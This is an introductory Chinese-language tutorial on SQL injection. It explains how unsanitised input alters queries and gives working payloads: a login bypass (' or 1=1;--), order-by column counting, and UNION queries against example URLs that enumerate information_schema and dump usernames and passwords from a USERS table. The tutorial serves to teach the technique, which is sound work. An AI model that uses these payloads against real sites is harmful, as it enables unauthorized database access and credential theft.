**SQL注入介绍与初步学习**

  

01 SQL注入基本原理

  

  

## 

**1.1 什么是SQL注入**

  

## 

SQL的中文全称为结构化查询语言，是一种用于关系型数据库系统的程序语言，可以用来在数据库中对数据进行处理，最常见的操作是对数据的插入、删除、修改、查询等。常见的SQL数据库比如MySQL、SQL Server等。

  

SQL注入攻击通过提供恶意的数据包，比如通过HTTP 的POST参数的值将想要注入的SQL语句提交，如果程序设计不当，忽略了检查，那么提交的恶意SQL语句就会成功注入到原有的SQL语句中从而被数据库执行，这样就可以达到额外执行SQL语句的目的，而额外的SQL语句则就可以进行数据库的增删改查，使用目标应用被拖库、数据库遭破坏或者其他损失。

  

## 

**1.2 简单示例**

  

## 

正常的用户登录行为，用户提交的主要字段是用户名和密码，程序在收到用户名和密码后往往会先去数据库中查询用户名和密码是否等于用户输入内容，如果用户存在，即在数据库中查询到对应的数据记录，则登录成功，如果用户不存在，则登录失败。

  

这里就涉及到了数据库的查询操作，SQL语句大概是这样的：

```
select \* from users where user='用户名' and password='password\_hash';
```

![](../Images/d34c771bc1ae02ed3cbff2e902dc7f69.png)

  

这个语句里的「用户名」和「密码」的值是通过用户在登录界面提交的，如果程序没有做相关的过滤和检查，那么就可以提交一些『特殊的用户名』来达到修改SQL语句结构从而改变查询。这里的用户名和密码就是SQL注入的注入点。

  

我们将输入的用户名改为：

```
' or 1=1;--
```

那么整个SQL语句就成了：

  

![](../Images/456df660c28e2475173619b81f10b157.png)     

引号的作用是闭合前一个引号的，这样SQL语句才完整而不会报错，这跟XSS的Payload构造是一样。这条语句执行后会返回所有记录，按照刚才介绍的登录逻辑，就会登录成功。这个例子实际上就是一个最简单的SQL注入攻击。

**2.1 SQL 注入点**

  

只要跟网站数据库有交互的地方都有可能存在SQL注入，比较常见的位置有如url的参数部分、POST方法的参数、HTTP数据包头的cookie。

![](../Images/afb1b9ac3d15eafb869aec46cd033254.png)     

SQL注入点的判断，可能稍微有做过相关了解的同学听过and 1=1 和and 1=2或者引号的方式去判断SQL注入，这两种确实就是最经常用的SQL注入点的判断方式。

  

**2.2 简单示例**

  

比如访问网址为：

```
http://www.pockr.org/sql/user.php?id=1
```

程序执行代码为：

![](../Images/e2e91a7439ac6e15247cd109c9c43912.png)      

通过代码我们可以看到SQL语句为：

SELECT first\_name, last\_name FROM users WHERE id = id  

```


```

在SQL语句里，通过”select 字段”来指定要查询的字段的数据值，而在这里例子里由于select的字段已经固定为first\_name, last\_name，我们可控制的只有where条件后的id的值，所以我们没法查询出first\_name, last\_name两个字段外的第三个内容，那么又该如何呢？

  

我们需要多一个select，可以使用UNION操作符。UNION操作符的作用是合并两个或多个 SELECT 语句的结果，但有个条件，UNION连接的每个SELECT语句必须有相同的字段数；

  

比如我们上面语句里是first\_name, last\_name两个字段，那么后面跟的UNION查询的select的字段也必须为两个，比如：

  

```
SELECT first\_name, last\_name FROM users WHERE id = id UNION SELECT 1,2 from users；
```

  

这个例子里我们可以直接看到代码，所以可以直接看到原始SQL语句Select的字段数量为2，在实际攻防场景中，无法看源码和原始SQL语句，所以要使用UNION查询的前提是先确认应用功能中使用的SQL查询语句的字段数，我们可以通过**order by 数字**来进行判断。

  

接下来我们来尝试用UNION查询来获取当前应用连接操作的MySQL用户，可以这样构造语句：

  

```
SELECT first\_name, last\_name FROM users WHERE id = \-1 UNION SELECT 1, user() ；
```

  

通过SQL注入页面会显示泄露MySQL用户的用户名，达到SQL注入的目的。

  

  

****2.3 常见的MySQL函数****  

  

结合函数我们可以利用UNION联合查询注入获取更多的数据  

      ![](../Images/d1ca645a0616f3e9619e1113abe37ee6.png)     

information\_schema这个数据库是MySQL5.0之后才有的数据库，这是MySQL自带的数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称：

  

其中三个表：

  

schemata:存储了mysql中所有的数据库信息

tables:存储了数据库中的表的信息

columns:详细地描述了某张表的所有的列以及每个列的信息

  

通过这三个表我们可以榨取出我们需要的数据。比如：

  

*   获取当前数据库：
    

```
http://www.pockr.org/xxx/user.php?id=-1 UNION SELECT 1,database()

```

*   获取了所有数据库名：
    

```
http://www.pockr.org/xxx/user.php?id=-1 UNION SELECT 1,SCHEMA\_NAMEfrom information\_schema.SCHEMATA
```

  

*   获取当前数据库中的所有表名：
    

```
http://www.pockr.org/xxx/user.php?id=-1 UNION SELECT 1,table\\\_namefrom information\\\_schema.tables where table\\\_schema=database()
```

  

*   获取USERS表中的所有字段名：
    

```
http://www.pockr.org/xxx/user.php?id=-1 UNION SELECT 1,column\\\_namefrom information\\\_schema.columns where table\\\_name='USERS'
```

  

*   得到了数据库名、表名、列名后我们就可以进行数据的榨取，即所谓的脱裤了：
    

```
http://www.pockr.org/xxx/user.php?id=-1 UNION SELECT user,password from USERS
```

  

这大概就是整个SQL注入过程了，主要是通过MySQL来进行相关的说明，针对一些其他的数据库，相关的数据比如字段名的获取结构会有一些不同，可以自己扩展了解。
